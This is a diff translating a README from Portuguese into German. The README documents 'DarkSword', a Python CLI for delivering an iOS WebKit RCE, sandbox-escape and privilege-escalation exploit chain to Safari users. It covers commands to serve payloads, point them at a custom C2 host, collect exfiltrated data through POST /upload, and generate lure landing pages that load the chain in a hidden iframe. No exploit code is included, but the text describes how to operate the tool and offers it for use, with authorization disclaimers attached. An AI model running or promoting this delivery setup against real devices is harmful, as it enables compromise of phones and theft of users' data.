@@ -1,15 +1,15 @@
 # DarkSword Red Team Framework
 
-Framework Python com CLI para entrega da cadeia de exploits **DarkSword** em operações de red team. Baseado nos repositórios [DarkSword-RCE](https://github.com/htimesnine/DarkSword-RCE) e [darksword-kexploit](https://github.com/opa334/darksword-kexploit).
+Python-Framework mit CLI zur Bereitstellung der Exploit-Kette **DarkSword** bei Red-Team-Operationen. Basierend auf den Repositorys [DarkSword-RCE](https://github.com/htimesnine/DarkSword-RCE) und [darksword-kexploit](https://github.com/opa334/darksword-kexploit).
 
-> **Aviso**: Use apenas em ambientes autorizados. Operações de red team requerem autorização formal.
+> **Hinweis**: Nur in autorisierten Umgebungen verwenden. Red-Team-Operationen bedürfen einer formellen Genehmigung.
 
-## Referências
+## Referenzen
 
 - [Google Threat Intelligence - DarkSword iOS Exploit Chain](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain)
-- Suporta iOS 18.4 - 18.7 (WebKit RCE + privilege escalation)
+- Supported iOS 18.4 - 18.7 (WebKit RCE + privilege escalation)
 
-## Instalação
+## Installation
 
 ```bash
 git clone https://github.com/bhideki/darksword.git
@@ -17,89 +17,89 @@ cd darksword
 pip install -e .
 ```
 
-## Uso Rápido
+## Schnellstart
 
 ```bash
 darksword serve
 ```
 
-Acesse de um dispositivo iOS (Safari): `http://<SEU_IP>:8080/`
+Rufen Sie die Seite von einem iOS-Gerät (Safari) auf: `http://<IHRE_IP>:8080/`
 
-Payloads e kexploit ja incluidos. Para atualizar: `darksword sync` e `darksword sync-kexploit`
+Payloads und Kexploits sind bereits enthalten. Zum Aktualisieren: `darksword sync` und `darksword sync-kexploit`
 
-## Comandos CLI
+## Kommandozeilenbefehle
 
-| Comando | Descrição |
+| Befehl | Beschreibung |
 |---------|-----------|
-| `darksword serve` | Inicia servidor HTTP para entrega dos exploits |
-| `darksword sync` | Baixa payloads do repositório DarkSword-RCE |
-| `darksword list` | Lista payloads disponíveis localmente |
-| `darksword info` | Exibe informações sobre a cadeia e CVEs |
-| `darksword template generate` | Gera landing page personalizada |
-| `darksword template list` | Lista templates disponíveis |
-| `darksword sync-kexploit` | Baixa kernel exploit (opa334, Objective-C) |
+| `darksword serve`| Startet einen HTTP-Server zur Bereitstellung der Exploits |
+| `darksword sync` | Lädt Payloads aus dem DarkSword-RCE-Repository herunter |
+| `darksword list` | Listet lokal verfügbare Payloads auf |
+| `darksword info` | Zeigt Informationen zur Kette und zu CVEs an |
+| `darksword template generate` | Erstellt eine benutzerdefinierte Landingpage |
+| `darksword template list` | Listet verfügbare Vorlagen auf |
+| `darksword sync-kexploit` | Lädt einen Kernel-Exploit herunter (opa334, Objective-C) |
 
-### Opções do `serve`
+### Optionen von `serve`
 
 ```
 darksword serve -H 0.0.0.0 -p 8080
 darksword serve -p 8443 --c2-host https://seu-c2.com/payload
 ```
 
-- `-H, --host`: Host (padrão: 0.0.0.0)
-- `-p, --port`: Porta (padrão: 8080)
-- `--c2-host`: C2 customizado (ex: `http://seu-ip:8080`) - sobrescreve host/porta no pe_main.js
-- `--redirect`: URL de redirecionamento em fallback
+- `-H, --host`: Host (Standard: 0.0.0.0)
+- `-p, --port`: Port (Standard: 8080)
+- `--c2-host`: Benutzerdefinierter C2 (z. B.: `http://seu-ip:8080`) – überschreibt Host/Port in pe_main.js
+- `--redirect`: Fallback-Weiterleitungs-URL
 
-Sem `--c2-host`, o host/porta sao obtidos do Host header (mesmo servidor). Dados exfiltrados vao para `exfil/` e POST `/upload`.
+Ohne `--c2-host` werden Host und Port aus dem Host-Header übernommen (derselbe Server). Exfiltrierte Daten werden an `exfil/` gesendet und per POST an `/upload` übermittelt.
 
-### Gerar landing page customizada
+### Eine benutzerdefinierte Landingpage erstellen
 
 ```bash
-darksword template generate --title "Promoção Especial" --redirect https://site-legitimo.com
+darksword template generate --title „Sonderangebot“ --redirect https://site-legitimo.com
 ```
 
-## Estrutura do Projeto
+## Projektstruktur
 
 ```
 DarkSword/
-├── darksword/           # Modulo Python
-│   ├── cli.py          # CLI principal
-│   ├── server.py       # Servidor HTTP
-│   ├── payloads.py     # Sync e gestao de payloads
+├── darksword/           # Python-Modul
+│   ├── cli.py          # Haupt-CLI
+│   ├── server.py       # HTTP-Server
+│   ├── payloads.py     # Synchronisierung und Verwaltung von Payloads
 │   └── config.py
-├── payloads/            # Payloads Web (apos darksword sync)
-├── templates/           # Templates de landing page
-├── kexploit/            # Kernel exploit Obj-C (apos darksword sync-kexploit)
+├── payloads/            # Web-Payloads (nach „darksword sync“)
+├── templates/           # Landing-Page-Vorlagen
+├── kexploit/            # Kernel-Exploit in Objective-C (nach „darksword sync-kexploit“)
 ├── pyproject.toml
 └── README.md
 ```
 
-### Verificacao repos
+### Repo-Überprüfung
 
-| Repo | Arquivos |
+| Repo | Dateien |
 |------|----------|
 | **htimesnine/DarkSword-RCE** | index.html, frame.html, rce_loader.js, rce_module*.js, rce_worker*.js, sbx*.js, pe_main.js |
-| **ghh-jb/DarkSword** | Identico (fallback) |
+| **ghh-jb/DarkSword** | Identisch (Fallback) |
 | **opa334/darksword-kexploit** | Makefile, src/main.m, entitlements.plist |
-| **Nao publico** | rce_worker_18.7.js (iOS 18.7) |
+| **Nicht öffentlich** | rce_worker_18.7.js (iOS 18.7) |
 
-## Fluxo da Cadeia DarkSword
+## Ablauf der DarkSword-Kette
 
-1. **index.html** → Landing page carrega frame.html em iframe oculto
-2. **frame.html** → Injeta rce_loader.js
-3. **rce_loader.js** → Carrega módulos RCE conforme versão do iOS
-4. **rce_module.js / rce_module_18.6.js** → Módulos RCE
-5. **rce_worker_18.4.js / rce_worker_18.6.js** → Web Workers (exploits JSC)
-6. **sbx0_main_18.4.js / sbx1_main.js** → Sandbox escape
-7. **pe_main.js** → Privilege escalation
+1. **index.html** → Die Landingpage lädt frame.html in einem versteckten Iframe
+2. **frame.html** → Fügt rce_loader.js ein
+3. **rce_loader.js** → Lädt RCE-Module entsprechend der iOS-Version
+4. **rce_module.js / rce_module_18.6.js** → RCE-Module
+5. **rce_worker_18.4.js / rce_worker_18.6.js** → Web Workers (JSC-Exploits)
+6. **sbx0_main_18.4.js / sbx1_main.js** → Sandbox-Escape
+7. **pe_main.js** → Privilegieneskalation
 
-## Requisitos Éticos
+## Ethische Anforderungen
 
-- **Autorização**: Use apenas contra sistemas que você tem permissão explícita para testar
-- **Escopo**: Respeite os limites definidos no contrato/escopo do engajamento
-- **Documentação**: Registre todas as atividades para relatórios de red team
+- **Genehmigung**: Verwenden Sie das Tool nur für Systeme, für deren Testen Sie die ausdrückliche Genehmigung haben
+- **Umfang**: Halten Sie sich an die im Vertrag bzw. im Auftragsumfang festgelegten Grenzen
+- **Dokumentation**: Protokollieren Sie alle Aktivitäten für die Berichte des Red Teams
 
-## Licença
+## Lizenz
 
-MIT - Apenas para fins educacionais e de testes de segurança autorizados.
+MIT – Nur für Bildungszwecke und autorisierte Sicherheitstests.
